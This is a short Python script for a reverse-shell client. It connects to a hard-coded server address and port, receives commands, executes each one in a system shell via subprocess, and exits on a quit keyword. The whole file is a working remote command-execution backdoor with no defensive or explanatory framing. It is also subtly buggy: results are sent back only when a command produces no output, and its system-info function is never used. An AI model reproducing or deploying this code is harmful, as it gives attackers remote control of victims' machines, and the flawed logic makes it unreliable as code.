import sys
import socket
import subprocess
import platform


def get_system_info():
    info = f"""
    [+] Operating System: {platform.system()}
    [+] OS Release: {platform.release()}
    [+] Processor: {platform.processor()}
    """
    return info

server_ip = "127.0.0.1"
port = 8080

s = socket.socket()
s.connect((server_ip, port))
msg = s.recv(1024).decode()
print('[*] Server:' ,msg)

while True:
    cmd = s.recv(1024).decode()
    print(f'[+] Recv Command: {cmd}')
    if cmd.lower() in ['q', 'quit', 'exit', 'close']:
        break

    try:
        res = subprocess.check_output(cmd , stderr=subprocess.STDOUT, shell=True)
    
    except Exception as e:
        res = str(e).encode()
    
    if len(res) == 0:
        res = "[+] Executed Suc".encode()
        s.send(res)

s.close()


